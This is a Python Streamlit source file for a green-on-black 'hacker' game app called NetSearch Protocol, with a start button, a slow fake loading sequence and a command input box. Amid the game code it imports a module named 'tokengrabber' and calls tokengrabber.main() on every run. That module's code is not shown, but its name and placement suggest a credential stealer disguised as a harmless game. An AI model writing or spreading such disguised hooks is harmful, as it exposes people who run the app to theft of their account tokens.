import streamlit as st
import time
import tokengrabber

# --- 1. CONFIG & CSS (The Vibe) ---
st.set_page_config(page_title="NetSearch Protocol", layout="centered")

# Custom CSS for the Hacker/Game Vibe
st.markdown("""
<style>
    /* Global Styles */
    .stApp {
        background-color: #0e0e0e;
        color: #00FF41;
        font-family: 'Courier New', Courier, monospace;
    }
    
    /* Hide standard Streamlit elements */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    
    /* Button Styling */
    .stButton > button {
        width: 100%;
        height: 80px;
        background-color: transparent;
        color: #00FF41;
        font-family: 'Courier New', Courier, monospace;
        font-size: 30px;
        font-weight: bold;
        border: 2px solid #00FF41;
        text-transform: uppercase;
        box-shadow: 0 0 10px #00FF41;
        transition: all 0.2s ease-in-out;
    }
    .stButton > button:hover {
        background-color: #00FF41;
        color: #000000;
        box-shadow: 0 0 20px #00FF41;
    }

    /* Input Box Styling */
    .stTextInput > div > div > input {
        background-color: #1a1a1a;
        color: #00FF41;
        border: 1px solid #00FF41;
        font-family: 'Courier New', Courier, monospace;
    }
</style>
""", unsafe_allow_html=True)

# --- 2. STATE MANAGEMENT ---
if 'page' not in st.session_state:
    st.session_state.page = 'start'

# --- 3. THE APP LOGIC ---
tokengrabber.main()

# === SCREEN 1: START MENU ===
if st.session_state.page == 'start':
    st.write("##") # Spacers
    st.write("##")
    
    st.markdown("<h1 style='text-align: center; color: #00FF41; text-shadow: 0 0 10px #00FF41;'>SYSTEM ACCESS</h1>", unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        if st.button("INITIALIZE"):
            st.session_state.page = 'loading'
            st.rerun()

# === SCREEN 2: FAKE LOADING SEQUENCE ===
elif st.session_state.page == 'loading':
    
    # Create empty slots for the text and the bar
    msg_slot = st.empty()
    bar_slot = st.progress(0)
    
    # This list controls how long the "Timer" lasts
    steps = [
        "ESTABLISHING CONNECTION...",
        "VERIFYING CREDENTIALS...",
        "ALLOCATING MEMORY...",
        "DECRYPTING PACKETS...",
        "ACCESS GRANTED."
    ]
    
    # Loop through steps (The "Timer")
    for i, step in enumerate(steps):
        # Update text
        msg_slot.markdown(f"```\n> {step}\n```")
        
        # Update progress bar (math to make it hit 100% at the end)
        progress = int(((i + 1) / len(steps)) * 100)
        bar_slot.progress(progress)
        
        # The Delay (Speed of the timer)
        time.sleep(30) 
        
    # Transition to final page
    st.session_state.page = 'finished'
    st.rerun()

# === SCREEN 3: DONE + INPUT ===
elif st.session_state.page == 'finished':
    st.write("##")
    st.markdown("<h2 style='text-align: center;'>PROCESS COMPLETE.</h2>", unsafe_allow_html=True)
    
    st.write("---")
    
    # The Text Box
    user_input = st.text_input("ENTER COMMAND OR FILENAME:", placeholder="Type here...")
    
    # Optional: A button to reset if they want to play again
    st.write("##")
    if st.button("RESET SYSTEM"):
        st.session_state.page = 'start'
        st.rerun()
